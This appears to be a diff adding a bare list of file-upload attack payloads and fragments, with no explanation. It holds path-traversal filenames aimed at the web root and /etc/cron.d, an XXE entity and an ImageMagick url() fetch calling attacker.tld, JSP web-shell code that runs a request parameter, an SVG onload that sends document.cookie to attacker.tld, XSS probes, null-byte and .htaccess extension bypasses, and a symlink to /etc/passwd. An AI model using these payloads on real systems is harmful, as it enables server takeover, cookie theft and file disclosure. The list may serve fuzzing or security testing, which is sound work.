@@ -1,0 +1,40 @@
+../../../../var/www/html/shell.php
+../../../etc/cron.d/x
+/etc/passwd
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.tld/x">]>
+<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); %>
+<%@ page import="java.util.*,java.io.*"%>
+</svg>
+<?php ... ?>
+<?php phpinfo(); ?>
+<?xml version="1.0" encoding="UTF-8"?>
+<html><script>alert(1)</script></html>
+<pre><% BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null) out.println(l); %></pre>
+<root>&xxe;</root>
+<script src="x.gif">
+<script src=...>
+<script>alert(document.domain)</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker.tld/x?'+document.cookie)">
+AddType application/x-httpd-php .png
+Content-Disposition: attachment; filename=...
+Content-Type: image/jpeg
+Content-Type: image/svg+xml
+Content-Type: text/plain
+GIF89a/*
+disable_functions = system,exec,shell_exec,passthru,...
+file:///etc/passwd
+fill 'url(https://attacker.tld/x)'
+https://target/uploads/avatar.svg
+if ext == ".php": reject
+link -> /etc/cron.d/
+link/x
+ln -s /etc/passwd link.txt
+phar://
+push graphic-context\nencoding "UTF-8"\nimage Over 0,0 0,0 'url(https://attacker.tld/x)'\npop graphic-context
+readonly=false
+shell.jsp/
+shell.jsp?c=id
+shell.php%00.jpg
+system('id')
+text/html
+word/document.xml
